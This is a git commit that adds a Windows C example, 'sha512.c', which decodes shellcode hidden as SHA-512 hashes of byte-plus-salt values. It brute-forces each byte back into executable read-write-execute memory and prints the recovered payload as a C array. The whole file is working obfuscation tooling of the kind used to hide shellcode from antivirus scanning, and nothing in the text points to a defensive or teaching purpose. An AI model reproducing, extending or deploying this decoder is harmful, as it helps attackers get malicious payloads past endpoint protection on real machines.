16485d03277f57486aac819abef14c55ee1feaa7
Ved Prakash Gupta <vedprakashgupta008@gmail.com>
2025-05-25 19:57:58 +0530

    Create sha512.c

---
+++ examples/sha512.c
@@ -0,0 +1,77 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wincrypt.h>
+#include "shellcode.h"
+
+#pragma comment(lib, "advapi32.lib")
+
+void decode_sha512(const char *encoded[], int elements, unsigned char *shellcode, int salt)
+{
+    HCRYPTPROV hProv = 0;
+    BYTE digest[64];
+    DWORD digest_len;
+    CHAR hex_char[] = "0123456789abcdef";
+    char sha512_str[129];
+    char str[20];
+
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+        return;
+
+    for (int i = 0; i < elements; i++)
+    {
+        for (int j = 0; j <= 255; j++)
+        {
+            HCRYPTHASH hHash = 0;
+            digest_len = 64;
+
+            if (!CryptCreateHash(hProv, CALG_SHA_512, 0, 0, &hHash))
+                continue;
+
+            sprintf_s(str, sizeof(str), "%d%d", j, salt);
+
+            if (CryptHashData(hHash, (BYTE *)str, (DWORD)strlen(str), 0) &&
+                CryptGetHashParam(hHash, HP_HASHVAL, digest, &digest_len, 0))
+            {
+                for (DWORD k = 0; k < digest_len; k++)
+                {
+                    sha512_str[k * 2] = hex_char[digest[k] >> 4];
+                    sha512_str[k * 2 + 1] = hex_char[digest[k] & 0xF];
+                }
+                sha512_str[digest_len * 2] = '\0';
+
+                if (strcmp(sha512_str, encoded[i]) == 0)
+                {
+                    shellcode[i] = (unsigned char)j;
+                    CryptDestroyHash(hHash);
+                    break;
+                }
+            }
+
+            CryptDestroyHash(hHash);
+        }
+    }
+
+    CryptReleaseContext(hProv, 0);
+}
+
+int main()
+{
+    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (shellcode == NULL)
+        return 1;
+
+    decode_sha512(encoded, sizeof(encoded) / sizeof(encoded[0]), (unsigned char *)shellcode, shellcode_len);
+
+    printf("\nunsigned char shellcode[] = {");
+    for (unsigned int i = 0; i < shellcode_len; i++)
+    {
+        if (i % 20 == 0)
+            printf("\n\t");
+        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
+    }
+    printf("\n};\n");
+
+    return 0;
+}
